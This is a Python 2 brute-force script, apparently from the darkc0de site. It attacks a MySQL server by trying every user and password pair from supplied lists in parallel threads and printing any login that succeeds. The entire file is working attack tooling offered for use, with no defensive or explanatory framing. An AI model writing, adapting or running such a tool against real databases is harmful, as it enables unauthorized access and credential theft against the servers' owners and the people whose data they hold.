#!usr/bin/python
#MySQL Brute Forcer
#You need the MySQLdb package found here:
#http://sourceforge.net/projects/mysql-python

#http://www.darkc0de.com
#d3hydr8[at]gmail[dot]com

import threading, time, random, sys
from copy import copy

try:
	import MySQLdb
except(ImportError):
	print "\nYou need the MySQLdb package found here: http://sourceforge.net/projects/mysql-python\n"
	sys.exit(1)

if len(sys.argv) !=6:
	print "Usage: ./mysqlbrute.py <server> <port> <database> <userlist> <wordlist>"
	sys.exit(1)

try:
  	users = open(sys.argv[4], "r").readlines()
except(IOError): 
  	print "Error: Check your userlist path\n"
  	sys.exit(1)
  
try:
  	words = open(sys.argv[5], "r").readlines()
except(IOError): 
  	print "Error: Check your wordlist path\n"
  	sys.exit(1)

print "\n\t   d3hydr8[at]gmail[dot]com MySQLBruteForcer v1.0"
print "\t--------------------------------------------------\n"
print "[+] Server:",sys.argv[1]
print "[+] Port:",sys.argv[2]
print "[+] Database:",sys.argv[3]
print "[+] Users Loaded:",len(users)
print "[+] Words Loaded:",len(words),"\n"

wordlist = copy(words)

def reloader():
	for word in wordlist:
		words.append(word)

def getword():
	lock = threading.Lock()
	lock.acquire()
	if len(words) != 0:
		value = random.sample(words,  1)
		words.remove(value[0])		
	else:
		print "\nReloading Wordlist - Changing User\n"
		reloader()
		value = random.sample(words,  1)
		users.remove(users[0])
		
	lock.release()
	if len(users) ==1:
		return value[0][:-1], users[0]
	else:
		return value[0][:-1], users[0][:-1]
		
class Worker(threading.Thread):
	
	def run(self):
		value, user = getword()
		try:
			print "-"*12
			print "User:",user,"Password:",value
			db=MySQLdb.connect(host=sys.argv[1],user=user,passwd=value,db=sys.argv[3],port=int(sys.argv[2]))
			print "\t\nLogin successful:",value, user
			db.close()
			work.join()
			sys.exit(2)
		except(MySQLdb.Error), msg: 
			#print "An error occurred:", msg
			pass
 
for i in range(len(words)*len(users)):
	work = Worker()
	work.start()
	time.sleep(1)
